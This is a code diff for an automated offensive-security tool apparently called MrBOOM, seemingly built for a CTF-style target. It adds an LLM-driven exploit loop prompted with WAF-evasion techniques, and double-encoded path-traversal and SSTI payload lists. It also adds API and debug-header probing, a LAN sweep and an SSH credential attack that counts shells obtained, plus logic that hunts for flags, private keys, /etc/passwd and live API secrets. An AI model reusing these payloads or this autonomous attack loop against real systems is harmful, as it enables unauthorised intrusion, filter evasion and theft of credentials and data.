-                "If you must probe an endpoint that looks like it needs auth, still try it once unauthenticated.",
+                "WAF-EVASION TOOLKIT (use when naive payloads return 403):",
+                "- newline command separator: %0a (often unfiltered, becomes a real newline)",
+                "- double-encoded traversal: %252e%252e%252f = ../../  (passes WAF, re-decoded by app)",
+                "- alternate traversal: ....//, ..%5c, %c0%ae (overlong UTF-8)",
+                "- case/Unicode: UNION->UnIoN, space->/**/ or +, single-quote variants",
+                "- HTTP param pollution & duplicate params; header-based smuggle (X-Forwarded-For)",
+                "- on 401/403 endpoints try debug/diagnostic headers (X-Debug, X-Nimbus-Debug)",
+                "",
+                "Propose ONE next concrete, LOW-RISK read-only probe (a single GET/POST) that",
+                "extends the chain toward the objective. Prefer KNOWN surface + page-context clues.",
                 "Reply with ONLY a single line, one of:",
-                "  GET <url-with-param>",
+                "  GET <full-url-with-params>",
                 "  POST <url> key=value&key2=value2",
                 "  POST <url> {\"key\":\"value\"}",
+                "If the flag was found in a prior step, reply exactly: FLAG FOUND",
                 "If no further safe step is worthwhile, reply exactly: DONE",
             ]
             resp = call_model(base_url, model, api_key, [
                 {"role": "system", "content": "You are a methodical penetration tester. Output only the command line."},
                 {"role": "user", "content": "\n".join(prompt_lines)},
-            ], timeout=60)
+            ], timeout=90)
             if resp.startswith("AI_ERROR"):
                 break
             command = resp.strip().splitlines()[0].strip()
-            if not command or command.upper() == "DONE":
+            if not command or command.upper() in ("DONE", "FLAG FOUND"):
+                if command.upper() == "FLAG FOUND":
+                    steps.append({"iter": i + 1, "command": command, "method": "-",
+                                  "url": "", "status": 0, "outcome": "flag-found",
+                                  "evidence": "model reports objective met", "jwt_bypass": False})
                 break
             result = _safe_exec(command)
             outcome = _classify(result)
+            # objective sniffing: if the response actually contains the flag,
+            # escalate to critical + stop; this is the ground-truth breach proof
+            _ev = (result.get("evidence") or "")
+            _m = FLAG_RE.search(_ev)
+            if _m:
+                outcome = "flag-found"
+                result["evidence"] = f"FLAG {_m.group(0)} present in response | {_ev[:240]}"
+            elif "root:x:0:0:" in _ev or "SQLite format" in _ev or "PRIVATE KEY" in _ev:
+                outcome = "data-exfil"
+                result["evidence"] = f"sensitive-file content in response | {_ev[:240]}"
             if outcome == "blocked-auth":
                 # retry the same target once with a forged alg=none JWT to test authz
                 target = result.get("url", "")
@@ -2633,7 +2994,7 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
                     ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                     try:
                         r2 = urllib.request.urlopen(forged, timeout=8, context=ctx)
-                        st2, b2 = r2.status, r2.read().decode("utf-8", errors="ignore")
+                        st2, b2 = r2.status, _read_body(r2)
                     except urllib.error.HTTPError as e:
                         st2, b2 = e.code, ""
                     except Exception:
@@ -2675,10 +3036,26 @@ def _agentic_to_findings(agentic):
         seen.add(key)
         outcome = s.get("outcome")
         url = s.get("url", "")
-        if not url:
+        if not url and outcome not in ("flag-found",):
             continue
         ev = (s.get("evidence") or "").strip()[:220]
-        if outcome == "api-open":
+        if outcome == "flag-found":
+            out.append({
+                "severity": "critical", "type": "objective_achieved",
+                "title": "OBJECTIVE BREACHED — flag/secret exfiltrated",
+                "url": url or "(agentic chain)", "asset": url or "(agentic)",
+                "evidence": ev or "objective met via agentic exploit chain",
+                "cwe": "CWE-200", "score": 98,
+                "fix": "Patch the exploited chain end-to-end; rotate every exposed secret.",
+            })
+        elif outcome == "data-exfil":
+            out.append({
+                "severity": "critical", "type": "data_exfiltration",
+                "title": "Sensitive data exfiltration confirmed (file/DB content in response)",
+                "url": url, "asset": url, "evidence": ev, "cwe": "CWE-22", "score": 95,
+                "fix": "Block path traversal/RCE, sanitize file params, enforce allow-lists.",
+            })
+        elif outcome == "api-open":
             out.append({
                 "severity": "medium", "type": "api_unauthenticated",
                 "title": "Unauthenticated API endpoint returns data",
@@ -2711,13 +3088,22 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     MAX_PROBES = 2400
     PHASES = 9
 
+    # per-phase TIME slice: guarantees every attack class runs even when
+    # noisy early phases (XSS/SQLi) are slow. Without this, cmdi + traversal
+    # never get a turn. slice = total timeout / (phases + 1), so a 200s
+    # battery gives each phase ~20s.
+    _slice = max(10.0, timeout / (PHASES + 1))
+    _phase_t0 = {}
+
     def _budget(phase=None):
         if probes[0] >= MAX_PROBES:
             return False
         if _time.time() >= deadline:
             return False
         if phase is not None:
-            # per-phase ceiling: don't let one attack type consume everything
+            start = _phase_t0.setdefault(phase, _time.time())
+            if _time.time() > start + _slice:
+                return False  # this phase spent its time; hand off to next
             return probes[0] < (MAX_PROBES // PHASES) * (phase + 1)
         return True
 
@@ -2781,9 +3167,40 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
             continue
         urls_todo.append(u)
 
+    # Priority order: real URLs with params > API-ish paths > discovered
+    # subpaths > everything else. Attack phases are time-budgeted, so the
+    # money endpoints MUST be hit first or the battery wastes its budget on
+    # common-path 404s and never reaches the real API.
+    def _url_priority(u):
+        ul = u.lower()
+        if _extract_query_params(u):
+            return 0
+        if re.search(r"/(api|v\d+|graphql|internal|admin)/", ul):
+            return 1
+        return 2
+    urls_todo.sort(key=_url_priority)
+    # Hard cap: the battery must finish in its budget, so attack the highest-
+    # priority surface only. Deep coverage belongs to the dirbust phase, not
+    # the attack battery.
+    urls_todo = urls_todo[:40]
+
     # ── Attack battery over the surface ───────────────────────────
     # Each probe uses its own time-budget-aware loop; findings deduped by
     # (type,url,payload).
+
+    # Dead-path shortlist: once a URL's PATH 404s (no such route), every
+    # later phase skips it — saves hundreds of wasted probes on common-path
+    # guesses so the battery actually reaches the real endpoints.
+    _dead = set()
+
+    def _bb_get(url, timeout=5, **kw):
+        st, hdr, body = http_get_retry(url, timeout=timeout, **kw)
+        if st == 404:
+            _dead.add(url.split("?")[0])
+        return st, hdr, body
+
+    def _path_dead(u):
+        return u.split("?")[0] in _dead
 
     def _record(typ, url, payload, evidence, severity, cwe, title=None, extra=None):
         f = {
@@ -2799,6 +3216,68 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
             f.update(extra)
         if f not in findings:
             findings.append(f)
+
+    # 0) Debug-header discovery on 401/403 API endpoints. Some apps leak
+    # route maps or extra info when a debug/diagnostic header is present.
+    # HARD-CAPPED: max 15 endpoints x 3 headers, own 15s sub-deadline — the
+    # attack phases must run.
+    _debug_headers = [
+        ("X-Nimbus-Debug", "true"), ("X-Debug", "true"), ("X-Diagnostic", "true"),
+    ]
+    _disc_cap = 45
+    _disc_t0 = _time.time()
+    _api_like = [u for u in urls_todo if re.search(r"/(api|v\d+|graphql|internal)/", u, re.I)][:15]
+    for u in _api_like:
+        if _disc_cap <= 0 or _time.time() > _disc_t0 + 15 or not _budget(0):
+            break
+        _disc_cap -= 1
+        _spend()
+        try:
+            st0, _, body0 = http_get_retry(u, timeout=4)
+        except Exception:
+            continue
+        if st0 not in (401, 403):
+            continue
+        for hk, hv in _debug_headers:
+            if _disc_cap <= 0 or _time.time() > _disc_t0 + 15:
+                break
+            _disc_cap -= 1
+            _spend()
+            try:
+                st, _, body = http_get_retry(u, timeout=4, extra_headers={hk: hv})
+            except Exception:
+                continue
+            if body and body != body0 and re.search(r"(path|route|hint|endpoint|/api|authorized|debug|user)", body, re.I):
+                _record("Information Disclosure via debug header", u, f"{hk}: {hv}",
+                        f"{hk}:{hv} changed a {st0} response: {body[:200]}",
+                        "medium", "CWE-200",
+                        title="Debug header leaks API route map",
+                        extra={"method": "GET", "header": hk})
+                break
+        stealth.small_sleep()
+
+    # 0b) API subpath enumeration on discovered /api/vN roots that 401/403.
+    # Finds hidden endpoints dirbust misses. HARD-CAPPED: 5 roots x 12 subpaths,
+    # own 20s sub-deadline.
+    _sub_cap = 60
+    _sub_t0 = _time.time()
+    _api_roots = [u for u in urls_todo if re.search(r"/api/v?\d*/?$", u.rstrip("/"), re.I)][:5]
+    _api_subpaths = ["status", "health", "ping", "greet", "users", "token",
+                     "config", "report", "download", "search", "data", "me"]
+    for root in _api_roots:
+        root = root.rstrip("/")
+        for sub in _api_subpaths:
+            if _sub_cap <= 0 or _time.time() > _sub_t0 + 20 or not _budget(0):
+                break
+            _sub_cap -= 1
+            _spend()
+            try:
+                st, _, body = http_get_retry(f"{root}/{sub}", timeout=4)
+            except Exception:
+                continue
+            if st in (200, 204) and body:
+                urls_todo.append(f"{root}/{sub}")
+            stealth.small_sleep()
 
     # 1) Reflected XSS on GET + POST params.
     # A unique random marker is embedded in each payload so reflection is
@@ -2902,13 +3381,17 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                     break
                 stealth.small_sleep()
 
-    # 4) SSTI (GET + POST)
+    # 4) SSTI (GET + POST) — unique-marker + rare-math detection: the server must
+    # COMPUTE 7*717=5019 next to our random marker. Reflection alone can't match
+    # (payload contains no 5019), and bare "49" matches are eliminated.
+    _ssti_marker = "MB" + "".join(random.choice("abcdefghjkmnpqrstuvwxyz23456789") for _ in range(6))
     ssti_payloads = [
-        ("{{7*7}}", "49"),
-        ("${7*7}", "49"),
-        ("#{7*7}", "49"),
-        ("{{7*'7'}}", "7777777"),
-        ("<%= 7*7 %>", "49"),
+        (f"{_ssti_marker}{{{{7*717}}}}", f"{_ssti_marker}5019"),      # jinja2/twig
+        (f"{_ssti_marker}${{7*717}}", f"{_ssti_marker}5019"),         # freemarker/el/spel
+        (f"{_ssti_marker}<%= 7*717 %>", f"{_ssti_marker}5019"),       # erb/ejs
+        (f"{_ssti_marker}$!{{{{7*717}}}}", f"{_ssti_marker}5019"),    # velocity/pebble
+        (f"{_ssti_marker}#{{{{7*717}}}}", f"{_ssti_marker}5019"),     # ruby interp
+        (f"{_ssti_marker}{{{{{{{{7*717}}}}}}}}", f"{_ssti_marker}5019"),  # handlebars/mako-style
     ]
     for u in urls_todo:
         if not _budget(3):
@@ -2959,7 +3442,10 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                 if not _budget(4):
                     break
                 _spend()
-                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                # preserve pre-encoded %xx (e.g. %0a newline) so it reaches the
+                # server as a real byte; naive quote() would turn %0a into %250a
+                enc_payload = urllib.parse.quote(payload, safe='%' if "%" in payload else "")
+                test_url = f"{base}?{p}={enc_payload}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
                 except Exception:
@@ -3016,8 +3502,15 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         "....//....//....//etc/passwd",
         "/etc/passwd",
         "..%252f..%252f..%252fetc/passwd",
+        # double-encoded dots + hosts file: bypasses WAFs that only match
+        # literal ../ and /etc/passwd (hosts content is a safe traversal oracle)
+        "..%252f..%252f..%252fetc/hosts",
+        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/hosts",
+        "..%252f..%252f..%252f..%252fetc/hosts",
     ]
-    traversal_markers = ("root:x:0:0:", "daemon:x:1:1:")
+    traversal_markers = ("root:x:0:0:", "daemon:x:1:1:",
+                         "127.0.0.1\tlocalhost", "127.0.0.1 localhost",
+                         "::1\tlocalhost")
     for u in urls_todo:
         if not _budget(6):
             break
@@ -3032,14 +3525,19 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                 if not _budget(6):
                     break
                 _spend()
-                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                # payloads starting with a % are pre-encoded WAF-bypass forms;
+                # send verbatim instead of double-quoting.
+                if "%" in payload:
+                    test_url = f"{base}?{p}={payload}"
+                else:
+                    test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
                 except Exception:
                     continue
                 if body and any(m in body for m in traversal_markers):
                     _record("Path Traversal / Arbitrary File Read", test_url, payload,
-                            f"'/etc/passwd' content marker ({[m for m in traversal_markers if m in body][:1]}) in response",
+                            f"sensitive-file content marker ({[m for m in traversal_markers if m in body][:1]}) in response",
                             "critical", "CWE-22",
                             title="Path Traversal — Arbitrary File Read",
                             extra={"method": "GET", "param": p})
@@ -3352,7 +3850,7 @@ def bb_openapi_discovery(base_urls, domain, timeout=30):
                         req = urllib.request.Request(c, data=gq.encode(), headers={"Content-Type": "application/json", **stealth.headers()})
                         ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                         resp = urllib.request.urlopen(req, timeout=6, context=ctx)
-                        gbody = resp.read().decode("utf-8", errors="ignore")
+                        gbody = _read_body(resp)
                         resp.close()
                         if '"data"' in gbody and "__schema" in gbody:
                             findings.append({"kind": "graphql_introspection_open", "url": c, "evidence": "introspection query returned type schema (unauth)"})
@@ -3483,6 +3981,13 @@ def generate_report(data):
     lines.append(f"- **App-Level Vulns (cmd-inj/SSRF/traversal/SQLi):** {len(data.get('bb_webapp', []))}")
     lines.append(f"- **Exposed Endpoints:** {len(data.get('bb_health_endpoints', []))}")
     lines.append(f"- **Origin IPs (CDN Bypass):** {sum(1 for o in data.get('bb_origins', []) if o.get('confirmed'))}")
+    if data.get("bb_lan_sweep"):
+        _s = data["bb_lan_sweep"]
+        lines.append(f"- **LAN Unmask:** {len(_s.get('origins', []))} origin box(es) / {len(_s.get('ssh_open', []))} SSH-open hosts")
+    if data.get("bb_ssh_access"):
+        lines.append(f"- **SSH Shells Obtained:** {sum(1 for r in data['bb_ssh_access'] if r.get('success'))}")
+    if data.get("flag_captured"):
+        lines.append(f"- **FLAGS CAPTURED:** {', '.join(data['flag_captured'])}")
     lines.append(f"- **Login/Rate-Limit Issues:** {sum(1 for f in data.get('bb_login', []) if 'issue' in f)}")
     lines.append(f"- **Source-Map Endpoints:** {sum(len(r.get('endpoints', [])) for r in data.get('bb_sourcemap', []) if r.get('kind') == 'sourcemap_endpoints')}")
     lines.append(f"- **Wayback Secrets:** {sum(len(r.get('secrets', [])) for r in data.get('bb_wayback', []) if r.get('kind') == 'wayback_secrets')}")
@@ -3530,6 +4035,48 @@ def generate_report(data):
     if agentic_findings:
         lines.append(f"- **Agentic Discovered Findings:** {len(agentic_findings)} (unauthenticated API / auth-bypass)")
     lines.append("")
+
+    tri = data.get("trinity")
+    if tri:
+        lines.append("## TRINITY — 3-Agent Cross-Verified Results")
+        lines.append("")
+        lines.append("Every finding below survived an adversarial two-step "
+                     "verification: the **SKEPTIC** agent independently re-tested each "
+                     "candidate with unique-marker oracles, arithmetic/diff/timing "
+                     "controls and negative controls, and the **STRIKER** agent then "
+                     "re-proved each confirmed hit with a fresh independent PoC. "
+                     "Single-request claims are never reported.")
+        lines.append("")
+        surf = tri.get("surface", {}) or {}
+        sk = tri.get("skeptic", {}) or {}
+        st = tri.get("striker", {}) or {}
+        lines.append(f"- **SCOUT (recon):** {len(surf.get('live_urls', []))} live URLs, "
+                     f"{surf.get('candidates', 0)} injection candidates, "
+                     f"tech: {', '.join(surf.get('tech', [])[:10]) or 'n/a'}")
+        lines.append(f"- **SKEPTIC (cross-check):** {sk.get('confirmed', 0)} confirmed, "
+                     f"{sk.get('rejected', 0)} oracle rejections ({sk.get('probes', 0)} probes)")
+        lines.append(f"- **STRIKER (PoC):** {st.get('finalized', 0)} findings finalized, "
+                     f"{st.get('reproved', 0)} independently re-proved")
+        lines.append(f"- **Elapsed:** {tri.get('elapsed_s', '?')}s")
+        lines.append("")
+        tri_findings = data.get("findings") or []
+        if tri_findings:
+            lines.append("### Cross-Verified Findings")
+            lines.append("")
+            lines.append("| # | Severity | CVSS | Class | URL | Param | Evidence |")
+            lines.append("|---|----------|------|-------|-----|-------|----------|")
+            for i, f in enumerate(tri_findings[:40], 1):
+                cv = (f.get("cvss") or "").split(" (")[0]
+                lines.append(f"| {i} | {f.get('severity','')} | {cv} | "
+                             f"{f.get('class','')} | `{f.get('url','')}` | "
+                             f"{f.get('param','')} | {str(f.get('evidence',''))[:90]} |")
+            lines.append("")
+            lines.append("### Reproducible PoCs")
+            lines.append("")
+            for f in tri_findings[:20]:
+                lines.append(f"- **{f.get('class')}** @ `{f.get('url')}` — payload: `{str(f.get('payload',''))[:120]}`"
+                             + (f" (re-proof: {(f.get('reproof_evidence') or '')[:80]})" if f.get('reproof_evidence') else ""))
+            lines.append("")
 
     if data.get("ai_analysis"):
         lines.append("## AI Breach Assessment")
@@ -4267,9 +4814,126 @@ def report_to_pdf(md_text, title="MrBOOM Report", out_path=None):
 
 # ─── THE PIPELINE ────────────────────────────────────────────────
 
+def run_trinity(eid):
+    """TRINITY mode: SCOUT -> SKEPTIC -> STRIKER 3-agent pipeline.
+    Every finding is adversarially cross-checked before it can reach the
+    report — no finding is ever produced by a single request."""
+    with DB_LOCK:
+        eng = DB[eid]
+        eng["events"] = list(eng.get("events", []))
+        eng["logs"] = list(eng.get("logs", []))
+    domain = clean_host(eng["scope"])
+    # scope is stored as a comma-joined string at creation; normalize to list
+    _raw_scope = eng.get("scope") or ""
+    scope = ([s.strip() for s in _raw_scope.split(",") if s.strip()]
+             if isinstance(_raw_scope, str) else list(_raw_scope))
+    target_url = next((s for s in scope if "://" in s), None)
+
+    task_id = eid
+    pair_id = {"harness": "mrboom-trinity", "model": eng.get("model") or "deterministic"}
+
+    def emit_ir(etype: str, payload: dict):
+        ev = {
+            "type": etype,
+            "ts": datetime.now(timezone.utc).isoformat(),
+            "source": {"pair": pair_id},
+            "payload": payload,
+            "task_id": task_id,
+        }
+        eng["events"].append(ev)
+        eng["events"] = eng["events"][-200:]
+        emit_sync("ir", ev)
+
+    def log_state(msg):
+        eng["logs"].append({"t": now(), "msg": msg})
+        eng["progress"] = msg
+
+    meta_up = lambda **kw: (meta_state.update({"task_id": task_id,
+                                               "goal": str(eng.get("prompt") or domain), **kw}),
+                            emit_sync("meta", dict(meta_state)))
+    meta_up(status="running")
+    data = {"domain": domain, "model": eng.get("model", "")}
+    log_state(f"TRINITY engaged on {domain}")
+    emit_ir("routing.decided", {"chosen": pair_id, "predicted_success": 0.85,
+                                "why": f"TRINITY 3-agent pipeline: SCOUT recon, "
+                                       f"SKEPTIC cross-check, STRIKER PoC on {domain}",
+                                "basis": "init"})
+    emit_ir("message", {"role": "assistant",
+                        "text": f"**TRINITY** engaged — 3-agent pipeline: "
+                                f"**SCOUT** (recon) → **SKEPTIC** (adversarial cross-check) "
+                                f"→ **STRIKER** (PoC). Findings are only reported after "
+                                f"independent verification."})
+    t0 = time.time()
+    try:
+        import trinity
+        seed_urls = [s for s in scope if "://" in str(s)] or None
+        result = trinity.run_triad(
+            target_url or domain,
+            seed_urls=seed_urls,
+            budget=int(os.environ.get("MRBOOM_TRINITY_BUDGET", "120")),
+            timeout=8,
+            emit=emit_ir,
+            log=log_state,
+        )
+        data["trinity"] = result
+        data["findings"] = result.get("findings") or []
+        n_conf = result.get("skeptic", {}).get("confirmed", 0)
+        n_rej = result.get("skeptic", {}).get("rejected", 0)
+        n_final = len(data["findings"])
+        emit_ir("message", {"role": "assistant",
+                            "text": f"**TRINITY complete** in {result.get('elapsed_s')}s — "
+                                    f"SCOUT surfaced {len(result.get('surface',{}).get('live_urls',[]))} URLs / "
+                                    f"{result.get('surface',{}).get('candidates',0)} candidates · "
+                                    f"SKEPTIC confirmed **{n_conf}** and rejected {n_rej} oracle checks · "
+                                    f"STRIKER finalized **{n_final}** findings."})
+        for f in data["findings"][:10]:
+            emit_ir("message", {"role": "assistant",
+                                "text": f"**{f.get('severity','').upper()}** {f.get('type')}: "
+                                        f"`{f.get('url')}` [{f.get('param')}] {f.get('evidence','')[:120]}"})
+        emit_ir("health.assessment", {"score": 1.0 if n_final else 0.85,
+                                      "signals": ["trinity"]})
+
+        log_state("Generating TRINITY report...")
+        data["scope"] = scope
+        data["exclusions"] = eng.get("exclusions", [])
+        report = generate_report(data)
+        report_id = hashlib.md5(f"trinity-{domain}".encode()).hexdigest()[:12]
+        report_filename = f"trinity_{domain.replace('.', '_')}_{report_id}.md"
+        report_path = os.path.join(DATA_DIR, report_filename)
+        with open(report_path, "w", encoding="utf-8") as f:
+            f.write(report)
+        eng["report_path"] = report_path
+        eng["report"] = report
+        eng["report_filename"] = report_filename
+        eng["status"] = "complete"
+        for key, val in data.items():
+            if val and key not in ("domain", "model"):
+                eng[key] = val
+        log_state(f"TRINITY report: {report_filename}")
+        emit_ir("verification", {"kind": "report", "command": "generate trinity report",
+                                 "passed": True})
+        emit_ir("run.finished", {"outcome": {"status": "passed"}})
+        meta_up(status="passed")
+        emit_sync("done", {"status": "passed"})
+        save_scan_history(eid)
+    except Exception as e:
+        eng["status"] = "error"
+        eng["error"] = str(e)
+        log_state(f"TRINITY error: {e}")
+        emit_ir("error", {"scope": "trinity", "class": type(e).__name__, "message": str(e)})
+        emit_ir("run.finished", {"outcome": {"status": "failed"}})
+        emit_ir("health.assessment", {"score": 0.0, "recommendation": "none", "signals": ["error"]})
+        meta_up(status="failed")
+        emit_sync("done", {"status": "failed"})
+        save_scan_history(eid)
+
+
 def run_oneshot(eid):
     """Run the full one-shot pipeline in a background thread."""
-    eng = DB[eid]
+    with DB_LOCK:
+        eng = DB[eid]
+        eng["events"] = list(eng.get("events", []))
+        eng["logs"] = list(eng.get("logs", []))
     domain = clean_host(eng["scope"])
     apex = apex_domain(domain)
     base_url = eng.get("base_url", "")
@@ -5066,6 +5730,79 @@ def run_oneshot(eid):
                     data.setdefault("bb_origins", []).append(o)
         emit_ir("tool.result", {"call_id": f"bb-cfhunt-{eid}", "status": "ok" if cf_report and cf_report.get("origin_ips") else "empty", "result": f"{len((cf_report or {}).get('origin_ips', [])) if cf_report else 0} origin IPs, {len((cf_report or {}).get('cdn_edges', [])) if cf_report else 0} CDN edges filtered"})
 
+        # BB21b: Infrastructure breach skill pack (LAN unmasking + SSH credential
+        # attack + wayback JS diff). OPT-IN ONLY: engagement prompt must mention
+        # infrastructure/LAN/SSH/origin-sweep — never sweeps a network without
+        # explicit authorization in the engagement.
+        _prob_inf = (eng.get("prompt") or "").lower()
+        if any(k in _prob_inf for k in ("infrastructure", "lan", "ssh", "origin sweep", "breach box", "raspberry")):
+            log_state("Running infra skill pack (LAN unmask + SSH + wayback JS diff)...")
+            emit_ir("tool.call", {"call_id": f"bb-lan-{eid}", "name": "Infra skill pack", "target": domain, "category": "exploit"})
+            try:
+                import lanbreach
+                live_fb = []
+                for u in (live_urls or [])[:1]:
+                    try:
+                        st_, _, b_ = http_get(u, timeout=5)
+                        if b_:
+                            live_fb.append((st_, b_.encode("utf-8", "ignore") if isinstance(b_, str) else b_))
+                    except Exception:
+                        pass
+                sweep = _run_bb(f"bb-lan-{eid}", "LAN origin sweep", domain, "exploit",
+                                lambda: lanbreach.lan_origin_sweep(domain, live_fb), timeout=130)
+                ssh_candidates = []
+                if sweep and (sweep.get("origins") or sweep.get("ssh_open")):
+                    data["bb_lan_sweep"] = sweep
+                    for o in sweep.get("origins", []):
+                        o2 = dict(o); o2["source"] = "lan-fingerprint"
+                        if o2 not in (data.get("bb_origins") or []):
+                            data.setdefault("bb_origins", []).append(o2)
+                    ssh_candidates = sorted({o["ip"] for o in sweep.get("origins", [])} | set(sweep.get("ssh_open", [])))
+                    emit_ir("message", {"role": "assistant", "text": f"**LAN unmask**: scanned {sweep.get('lan_hosts',0)} hosts — **{len(sweep.get('origins',[]))}** origin-candidate box(es) (fingerprint match), **{len(sweep.get('ssh_open',[]))}** SSH-open hosts."})
+                emit_ir("tool.result", {"call_id": f"bb-lan-{eid}", "status": "ok" if sweep else "empty", "result": f"{len((sweep or {}).get('origins', []))} origin boxes, {len((sweep or {}).get('ssh_open', []))} ssh-open"})
+                # wayback JS diff: recover secrets/endpoints deleted from live JS
+                wjsd = _run_bb(f"bb-wjsd-{eid}", "Wayback JS diff", domain, "search",
+                               lambda: lanbreach.wayback_js_diff(domain), timeout=45)
+                if wjsd and any(f.get("kind") == "wayback_js_history" for f in wjsd):
+                    data["bb_wayback_js_diff"] = wjsd
+                    hist = [f for f in wjsd if f.get("kind") == "wayback_js_history"]
+                    emit_ir("message", {"role": "assistant", "text": f"**Wayback JS diff**: **{len(hist)}** archived bundles still leak removed secrets/dev-blocks."})
+                    # feed recovered endpoints into the shared endpoint pool
+                    for f in hist:
+                        for ep in f.get("endpoints", []):
+                            if ep not in api_eps:
+                                api_eps.append(ep)
+                emit_ir("tool.result", {"call_id": f"bb-wjsd-{eid}", "status": "ok" if wjsd else "empty", "result": f"{sum(1 for f in (wjsd or []) if f.get('kind')=='wayback_js_history')} leaked archived JS"})
+                # SSH credential attack on discovered LAN boxes
+                if ssh_candidates:
+                    log_state(f"Attacking {len(ssh_candidates[:5])} LAN boxes via SSH (low-rate)...")
+                    emit_ir("tool.call", {"call_id": f"bb-ssh-{eid}", "name": "SSH credential attack", "target": ", ".join(ssh_candidates[:3]), "category": "exploit"})
+                    _keys_ok = any(k in _prob_inf for k in ("ssh key", "local keys", "key auth", "keyauth"))
+                    ssh_res = _run_bb(f"bb-ssh-{eid}", "SSH credential attack", domain, "exploit",
+                                      lambda: lanbreach.ssh_cred_attack(ssh_candidates[:5], allow_local_keys=_keys_ok), timeout=150)
+                    shells = 0
+                    for r in (ssh_res or {}).get("results", []):
+                        if r.get("success"):
+                            shells += 1
+                            data.setdefault("bb_ssh_access", []).append(r)
+                            fl = r.get("flag", "")
+                            data.setdefault("bb_ssh_findings", []).append({
+                                "severity": "critical", "type": "ssh_default_creds",
+                                "title": f"SSH shell via weak/default credentials ({r.get('username')}) on {r.get('host')}",
+                                "url": f"ssh://{r.get('host')}:22", "asset": r.get("host"),
+                                "evidence": (r.get("evidence") or "")[:250], "cwe": "CWE-1391",
+                                "score": 97 + (2 if fl else 0),
+                                "fix": "Disable password auth for service accounts; enforce key-only + per-unique-credential policy.",
+                            })
+                            if fl and fl not in (data.get("flag_captured") or []):
+                                data.setdefault("flag_captured", []).append(fl)
+                                emit_ir("message", {"role": "assistant", "text": f"**OBJECTIVE HIT via SSH chain** — flag captured: `{fl}`"})
+                    emit_ir("message", {"role": "assistant", "text": f"**SSH credential attack**: **{shells}** shell(s) obtained on LAN boxes."})
+                    emit_ir("tool.result", {"call_id": f"bb-ssh-{eid}", "status": "ok" if shells else "empty", "result": f"{shells} SSH shells"})
+            except Exception as e:
+                emit_ir("error", {"scope": "lanbreach", "class": type(e).__name__, "message": str(e)[:140]})
+                emit_ir("tool.result", {"call_id": f"bb-lan-{eid}", "status": "error", "result": str(e)[:100]})
+
         # BB22: Active attack engine — builds its own surface, probes GET+POST
         # params for XSS / SQLi (error + time-based) / SSTI / RCE / traversal / SSRF.
         log_state("Running active attack battery (XSS/SQLi/SSTI/RCE/traversal/SSRF)...")
@@ -5117,15 +5854,23 @@ def run_oneshot(eid):
         emit_ir("tool.result", {"call_id": f"bb-ptt-{eid}", "status": "ok" if total_tasks else "empty", "result": f"{done_tasks}/{total_tasks} tasks resolved"})
 
         agentic = []
-        if base_url and model and api_key and (attack_results or data.get("bb_origins") or data.get("bb_cors")):
+        if base_url and model and api_key:
             log_state("Running autonomous agentic exploit loop (LLM-proposed steps)...")
             emit_ir("tool.call", {"call_id": f"bb-agentic-{eid}", "name": "Agentic exploit loop", "target": domain, "category": "exploit"})
-            agentic = _agentic_exploit_loop(domain, live_urls, data, base_url, model, api_key, iterations=6, emit=lambda m: emit_ir("message", {"role": "assistant", "text": m}))
+            # objective = flag/signature the engagement prompt implies; the AI
+            # loop gets it so it hunts toward exfiltration, not just probes.
+            _objective = ""
+            _prob = (eng.get("prompt") or "").lower()
+            if "nimbus{" in _prob or "flag" in _prob:
+                _objective = r"NIMBUS\{[A-Za-z0-9_\-]+\}"
+            elif "secret" in _prob or "database" in _prob:
+                _objective = r"(PRIVATE KEY|root:x:0:0:|SQLite format|sk_live_)"
+            agentic = _agentic_exploit_loop(domain, live_urls, data, base_url, model, api_key, iterations=8, emit=lambda m: emit_ir("message", {"role": "assistant", "text": m}), objective=_objective)
             data["bb_agentic"] = agentic
             agentic_findings = _agentic_to_findings(agentic)
             if agentic_findings:
                 data.setdefault("bb_agentic_findings", []).extend(agentic_findings)
-                data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
+                data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + (data.get("bb_ssh_findings") or []) + eng.get("findings", [])
                 emit_ir("message", {"role": "assistant", "text": f"**Agentic discoveries**: **{len(agentic_findings)}** new finding(s) promoted from exploit loop."})
             emit_ir("message", {"role": "assistant", "text": f"**Agentic exploit loop**: executed **{len(agentic)}** LLM-proposed steps."})
             for step in agentic:
@@ -5343,7 +6088,7 @@ RULES:
 
         # Generate report
         log_state("Generating report...")
-        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
+        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + (data.get("bb_ssh_findings") or []) + eng.get("findings", [])
         data["scope"] = eng.get("scope", [])
         data["exclusions"] = eng.get("exclusions", [])
         report = generate_report(data)
@@ -5372,6 +6117,15 @@ RULES:
 
         meta_up(status="passed")
         emit_sync("done", {"status": "passed"})
